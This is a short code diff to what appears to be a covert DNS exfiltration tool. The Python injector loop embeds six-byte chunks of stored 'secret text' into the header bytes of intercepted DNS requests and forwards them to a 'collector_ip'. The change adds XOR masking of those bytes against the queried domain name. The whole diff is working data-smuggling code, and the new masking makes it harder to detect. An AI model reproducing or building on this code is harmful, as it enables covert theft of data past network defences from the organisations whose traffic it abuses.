@@ -35,13 +35,17 @@ def forward_dns_request(data, next_dns_address="1.1.1.1"):
     return data
 
 
-def encode_data(data):
+def encode_data(data, domain):
     secret = get_next_6_bytes_of_text()
-    print(secret)
+    secret = byte_xor(secret, bytes(domain[:6]))
     print(data)
     data = data[0:6] + secret + data[12:]
     print(data)
     return data
+
+
+def byte_xor(ba1, ba2):
+    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
 
 
 def load_secret_text_to_mem() -> bytes:
@@ -66,7 +70,7 @@ def get_next_6_bytes_of_text() -> bytes:
 def main_injector_loop(udps):
     while True:
         data, addr, type, domain, answer = receive_data(udps)
-        data = encode_data(data)
+        data = encode_data(data, domain)
         answer = forward_dns_request(data, collector_ip)
         udps.sendto(answer, addr)
 
